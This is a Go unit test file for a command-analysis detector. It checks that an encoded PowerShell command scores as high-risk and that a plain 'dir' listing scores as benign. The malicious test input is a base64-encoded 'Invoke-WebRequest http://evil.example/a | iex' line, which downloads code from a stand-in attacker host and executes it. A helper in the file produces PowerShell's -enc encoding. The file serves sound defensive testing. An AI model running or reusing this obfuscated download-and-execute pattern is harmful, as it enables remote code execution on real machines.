package commandanalysis

import (
	"encoding/base64"
	"testing"
	"unicode/utf16"
)

func psEncoded(v string) string {
	u := utf16.Encode([]rune(v))
	raw := make([]byte, len(u)*2)
	for i, x := range u {
		raw[i*2] = byte(x)
		raw[i*2+1] = byte(x >> 8)
	}
	return base64.StdEncoding.EncodeToString(raw)
}
func TestAnalyzeEncodedPowerShell(t *testing.T) {
	a := analyze("POWERSHELL", "powershell -enc "+psEncoded("Invoke-WebRequest http://evil.example/a | iex"))
	if a.Decoded == "" || a.RiskScore < 70 || !a.RequiresSandbox || len(a.IOCs) == 0 {
		t.Fatalf("unexpected analysis: %#v", a)
	}
}
func TestBenignCommandIsLowRisk(t *testing.T) {
	a := analyze("CMD", "dir C:\\Temp")
	if a.RiskScore != 0 || a.RequiresSandbox {
		t.Fatalf("unexpected benign result: %#v", a)
	}
}
